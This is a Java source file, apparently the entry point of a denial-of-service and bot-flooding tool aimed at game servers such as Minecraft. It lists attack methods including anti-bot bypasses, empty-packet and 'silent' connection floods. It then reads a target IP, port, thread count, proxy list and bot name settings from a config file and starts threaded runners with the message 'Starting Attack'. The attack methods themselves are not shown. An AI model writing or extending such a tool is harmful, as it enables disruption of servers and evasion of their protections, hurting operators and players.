package ir.s4eed_hd.pz;

import ir.s4eed_hd.pz.managers.Methods;
import ir.s4eed_hd.pz.managers.config;
import java.util.HashMap;

public class main {
	
	private static String host;
	private static int port;
	private static int threads;
	private static int loop;
	private static int delay;
	private static int protocol;
	private static int nickSize;
	private static String proxyFile;
	private static ProxyType proxyType;
	private static String prefix;
	private static String suffix;
	
	private static String method;
	private static HashMap<String, Object> data = new HashMap<String, Object>();
	
	public static void runMethod(){
		if ( method.toLowerCase().equals("join") )
			Methods.getManager().join();
		if ( method.toLowerCase().equals("ping") )
			Methods.getManager().ping();
		if ( method.toLowerCase().equals("2lsbypass") ){
			Methods.getManager().a2lsBypass();
		}
		if ( method.toLowerCase().equals("err0r") ){
			Methods.getManager().ERR0R();
		}
		if ( method.toLowerCase().equals("pz_fucker") ){
			Methods.getManager().pz_fucker();
		}
		if ( method.toLowerCase().equals("emptypacket") ){
			Methods.getManager().emptyPacket();
		}
		if ( method.toLowerCase().equals("silentattack") ){
			Methods.getManager().silentAttack();
		}
		if ( method.toLowerCase().equals("someuuid") ){
			Methods.getManager().someUUID();
		}
		if ( method.toLowerCase().equals("nantibot") ){
			Methods.getManager().nAntibot();
		}
	}
	
	public static void main(String[] args) {
		config c = config.getConfig();
		c.dropConfig();
		System.out.println("           *-  Methods  -*");
		System.out.println("  ");
		System.out.println("   [»] Join Methods ");
		System.out.println("  Join  |  2lsBypass  | nAntiBot  | someUUID");
		System.out.println("");
		System.out.println("   [»] Ping Methods");
		System.out.println("  Ping |  ERR0R");
		System.out.println("");
		System.out.println("   [»] Connection Log");
		System.out.println("  EmptyPacket  |  SilentAttack  |  PZ_Fucker");
		System.out.println(" ");
		System.out.println(" Setup Your Method in config.json");
		System.out.println("");
		System.out.println("Attack Will Start in 10s later..");
		try {
			Thread.sleep(10000L);
		} catch (InterruptedException e1) {
			e1.printStackTrace();
		}
		System.out.println(" ");
		host = (String) c.getValue("IP");
		port = (int) c.getValue("Port");
		threads = (int) c.getValue("Threads");
		loop = (int) c.getValue("Loop");
		delay = (int) c.getValue("Delay");
		protocol = (int) c.getValue("Protocol");
		nickSize = (int) c.getValue("NickSize");
		proxyFile = (String) c.getValue("ProxyFile");
		proxyType = (ProxyType) c.getValue("ProxyType");
		prefix = (String) c.getValue("BotPrefix");
		suffix = (String) c.getValue("BotSuffix");
		method = (String)c.getValue("Method");
		data.put("IP",host);
		data.put("Port", port);
		data.put("Thread",threads);
		data.put("Delay", delay);
		data.put("Loop", loop);
		data.put("Protocol",protocol);
		data.put("NickSize",nickSize);
		data.put("ProxyFile",proxyFile);
		data.put("ProxyType",proxyType);
		data.put("BotPrefix",prefix);
		data.put("BotSuffix",suffix);
		data.put("Method",method);
		Methods.getManager().setData(data);
		System.out.println("All Data Has Been loaded From Config .");
		System.out.println("Starting Attack to " + host + ":" + port);
		for ( int x = 0 ; x <= threads ; x++ ){
			new runner();
			try {
				Thread.sleep(delay);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		
	}
	
}
